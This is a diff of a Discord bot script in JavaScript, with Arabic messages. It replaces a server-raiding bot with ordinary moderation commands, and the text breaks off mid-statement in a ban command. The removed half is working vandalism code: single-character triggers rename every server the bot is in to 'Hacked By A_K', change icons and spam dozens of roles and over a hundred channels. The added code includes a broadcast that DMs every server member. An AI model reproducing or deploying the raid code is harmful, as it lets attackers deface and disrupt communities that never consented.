@@ -1,569 +1,278 @@
-const Discord = require("discord.js");
-const LOka = new Discord.Client();
-console.log('By KBOOOOOOOOSH-YT');
-LOka.on('ready', () => {
-  console.log(`Logged in as ${LOka.user.tag} !`);
- 
+const Discord = require('discord.js');
+const client = new Discord.Client();
+const prefix = '+'
+
+client.on('ready', () => {
+  console.log(`Logged in as ${client.user.tag}!`);
+client.user.setGame(`x:`,"http://twitch.tv/A_K")
+  console.log('')
+  console.log('')
+  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
+  console.log(`[Start] ${new Date()}`);
+  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
+  console.log('')
+  console.log('╔[════════════════════════════════════]╗');
+  console.log(`Logged in as * [ " ${client.user.username} " ]`);
+  console.log('')
+  console.log('Informations :')
+  console.log('')
+  console.log(`servers! [ " ${client.guilds.size} " ]`);
+  console.log(`Users! [ " ${client.users.size} " ]`);
+  console.log(`channels! [ " ${client.channels.size} " ]`);
+  console.log('╚[════════════════════════════════════]╝')
+  console.log('')
+  console.log('╔[════════════]╗')
+  console.log(' Bot Is Online')
+  console.log('╚[════════════]╝')
+  console.log('')
+  console.log('')
 });
-LOka.on('ready',  () => {
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
- 
-       
- 
+
+
+
+
+    client.on('message', message => {
+      var prefix = "+";
+      if(message.content.startsWith(prefix + 'move all')) {
+       if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send('**لايوجد لديك صلاحية سحب الأعضاء**');
+         if(!message.guild.member(client.user).hasPermission("MOVE_MEMBERS")) return message.reply("**لايوجد لدي صلاحية السحب**");
+      if (message.member.voiceChannel == null) return message.channel.send(`**الرجاء الدخول لروم صوتي**`)
+       var author = message.member.voiceChannelID;
+       var m = message.guild.members.filter(m=>m.voiceChannel)
+       message.guild.members.filter(m=>m.voiceChannel).forEach(m => {
+       m.setVoiceChannel(author)
+       })
+       message.channel.send(`**تم سحب جميع الأعضاء إليك**`)
+
+
+       }
+         });
+
+
+
+
+
+client.on('message', message => {
+    if (message.content.startsWith("رابط")) {
+
+  message.channel.createInvite({
+        thing: true,
+        maxUses: 5,
+        maxAge: 86400
+    }).then(invite =>
+      message.author.sendMessage(invite.url)
+    )
+    const embed = new Discord.RichEmbed()
+        .setColor("RANDOM")
+        .setDescription("| :white_check_mark:  | :heart:  تم ارسال الرابط على الخاص  ")
+      message.channel.sendEmbed(embed).then(message => {message.delete(10000)})
+              const Embed11 = new Discord.RichEmbed()
+        .setColor("RANDOM")
+                .setAuthor(message.guild.name, message.guild.iconURL)
+        .setDescription(`
+**
+---------------------
+-[**Wind**]  هذا هو رابط
+---------------------
+-هذا الرابط صالح ل 5 مستخدم فقط
+---------------------
+-هذا الرابط صالح لمده 24 ساعه فقط
+---------------------
+**`)
+      message.author.sendEmbed(Embed11)
+    }
 });
-var prefix = "-"
-LOka.on("message", message => {
-  if(!message.content.startsWith(prefix)) return;;
+
+
+
+
+client.on('message', message => {
+	const prefix = 'ا'
+if(!message.channel.guild) return;
+if(message.content.startsWith(prefix + 'سحب')) {
+ if (message.member.hasPermission("MOVE_MEMBERS")) {
+ if (message.mentions.users.size === 0) {
+ return message.channel.send(" <@${usermentioned}> منشن شخص ")
+}
+if (message.member.voiceChannel != null) {
+ if (message.mentions.members.first().voiceChannel != null) {
+ var authorchannel = message.member.voiceChannelID;
+ var usermentioned = message.mentions.members.first().id;
+var embed = new Discord.RichEmbed()
+ .setTitle("Succes!")
+ .setColor("#000000")
+ .setDescription(`لقد قمت بسحب <@${usermentioned}> الى الروم الصوتي الخاص بك:white_check_mark: `)
+var embed = new Discord.RichEmbed()
+.setTitle(`You are Moved in ${message.guild.name}`)
+ .setColor("#000000")
+.setDescription(`<@${message.author.id}> moved you to his channel!\nServer => ${message.guild.name}`)
+ message.guild.members.get(usermentioned).setVoiceChannel(authorchannel).then(m => message.channel.send(embed))
+message.guild.members.get(usermentioned).send(embed)
+} else {
+message.channel.send("``لا تستطيع سحب "+ message.mentions.members.first() +" `يجب ان يكون هذه العضو في روم صوتي`")
+}
+} else {
+ message.channel.send("``يجب ان تكون في روم صوتي لكي تقوم بسحب العضو أليك``")
+}
+} else {
+message.react("❌")
+ }}});
+
+
+
+
+
+client.on('voiceStateUpdate', (old, now) => {
+  const channel = client.channels.get('475994170343817226');
+  const currentSize = channel.guild.members.filter(m => m.voiceChannel).size;
+  const size = channel.name.match(/\[\s(\d+)\s\]/);
+  if (!size) return channel.setName(`#Wind Voice: ${currentSize}`);
+  if (currentSize !== size) channel.setName(`#Wind Voice:${currentSize}`);
+});
+
+
+
+
+client.on('message', function(message) {
+	const myID = "279194403564814336";
+    let args = message.content.split(" ").slice(1).join(" ");
+    if(message.content.startsWith(prefix + "setname")) {
+		        if(message.author.id !== myID) return;
+            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
+        client.user.setUsername(args);
+        message.channel.send(':white_check_mark: Done!').then(msg => {
+           msg.delete(5000);
+          message.delete(5000);
+        });
+    } else if(message.content.startsWith(prefix + "stream")) {
+		        if(message.author.id !== myID) return;
+            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
+        client.user.setGame(args , 'https://twitch.tv/A_K');
+        message.channel.send(':white_check_mark: Done!').then(msg => {
+           msg.delete(5000);
+          message.delete(5000);
+        });
+    } else if(message.content.startsWith(prefix + "play")) {
+				        if(message.author.id !== myID) return;
+            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
+        client.user.setGame(args);
+        message.channel.send(':white_check_mark: Done!').then(msg => {
+           msg.delete(5000);
+          message.delete(5000);
+        });
+    } else if(message.content.startsWith(prefix + "listen")) {
+				        if(message.author.id !== myID) return;
+            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
+        client.user.setActivity(args, {type:'LISTENING'});
+        message.channel.send(':white_check_mark: Done!').then(msg => {
+           msg.delete(5000);
+          message.delete(5000);
+        });
+    } else if(message.content.startsWith(prefix + "watch")) {
+				        if(message.author.id !== myID) return;
+            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
+        client.user.setActivity(args, {type:'WATCHING'});
+        message.channel.send(':white_check_mark: Done!').then(msg => {
+           msg.delete(5000);
+          message.delete(5000);
+        });
+    } else if(message.content.startsWith(prefix + "setavatar")) {
+				        if(message.author.id !== myID) return;
+        client.user.setAvatar(args);
+        message.channel.send(':white_check_mark: Done!').then(msg => {
+                if(!args) return message.reply('اكتب الحالة اللي تريدها.');
+           msg.delete(5000);
+          message.delete(5000);
+        });
+    }
+});
+
+
+client.on('message', message => {
+    if (message.author.id === client.user.id) return;
+    if (message.guild) {
+   let embed = new Discord.RichEmbed()
+    let args = message.content.split(' ').slice(1).join(' ');
+if(message.content.split(' ')[0] == prefix + 'bc') {
+    if (!args[1]) {
+message.channel.send("**.bc <message>**");
+return;
+}
+        message.guild.members.forEach(m => {
+   if(!message.member.hasPermission('ADMINISTRATOR')) return;
+            var bc = new Discord.RichEmbed()
+            .setAuthor(message.author.username, message.author.avatarURL)
+            .addField('** الـسيرفر**', `${message.guild.name}`,true)
+            .addField(' **الـمرسل **', `${message.author.username}#${message.author.discriminator}`,true)
+            .addField(' **الرسالة** ', args)
+            .setThumbnail(message.guild.iconURL)
+            .setColor('RANDOM')
+            m.send(`${m}`,{embed: bc});
+        });
+        const AziRo = new Discord.RichEmbed()
+        .setAuthor(message.author.username, message.author.avatarURL)
+        .setTitle('✔️ | جاري ارسال رسالتك ')
+        .addBlankField(true)
+        .addField('👥 | عدد الاعضاء المرسل لهم ', message.guild.memberCount , true)
+        .addField('📋| الرسالة ', args)
+        .setColor('RANDOM')
+        message.channel.sendEmbed(AziRo);
+    }
+    } else {
+        return;
+    }
+});
+
+
+
+
+client.on('message', message => {
+  if (message.author.x5bz) return;
+  if (!message.content.startsWith(prefix)) return;
+
+
+  let command = message.content.split(" ")[0];
+  command = command.slice(prefix.length);
+
   let args = message.content.split(" ").slice(1);
-  var argresult = args.join(' ');
-  if (message.content.startsWith('hix15')) {
-    LOka.user.setUsername(argresult);
-  }
-    if (message.content.startsWith(prefix + 'on123')) {
-    LOka.user.setStatus(argresult);
-  }
-});
- 
-var x1 = "kk"
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
- 
-}
-});
-var x1 = "kk"
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setUsername("Hacked By |  A_K. | Dont Cry.")
- 
-}
-});
-LOka.on('message', message => {
-     if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
- 
-}
-});
- 
-LOka.on('message', message => {
-     if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
-})
-}
-});
-LOka.on('message', message => {
-     if (message.content === ".") {
-         LOka.guilds.forEach(m =>{
-             m.setName(`Hacked By |  A_K. | Dont Cry.`)
-})
-}
-});
- 
-LOka.on('message', message => {
-     if (message.content === ".") {
-                 if(!message.channel.guild) return;
- 
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
- 
-}
-});
- 
-LOka.on('message', message => {
-     
- 
-     if (message.content === "k1") {
-         LOka.guilds.forEach(m =>{
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })           
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  m.createRole({
-        name : "Hacked By |  A_K. | Dont Cry.",
-        permissions :   [1],
-        color : " #ff0000"
-    })
-  
- 
- 
-   
-})
- 
- 
-}
-});
-LOka.on('message', message => {
-         if (message.content === "k") {
-               LOka.guilds.forEach(m =>{
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
-                 m.createChannel('Hacked By |"  A_K. "| Dont Cry.', 'text');
 
 
- 
-})
+
+  if (command == "ban") {
+  let rank = message.guild.member(message.author).roles.find('name', 'ban');
+  if (!rank) return message.reply('انت لا تمتلك الرتبه المخصصه لهذا الامر')
+    message.channel.send(args.join("  "))
+      message.delete();
+
+
+
+               if(!message.channel.guild) return message.reply('** This command only for servers**');
+
+
+  let user = message.mentions.users.first();
+  let reason = message.content.split(" ").slice(2).join(" ");
+  /*let b5bzlog = client.channels.find("name", "5bz-log");
+  if(!b5bzlog) return message.reply("I've detected that this server doesn't have a 5bz-log text channel.");*/
+  if (message.mentions.users.size < 1) return message.reply("**منشن شخص**");
+  if(!reason) return message.reply ("**اكتب سبب الطرد**");
+  if (!message.guild.member(user)
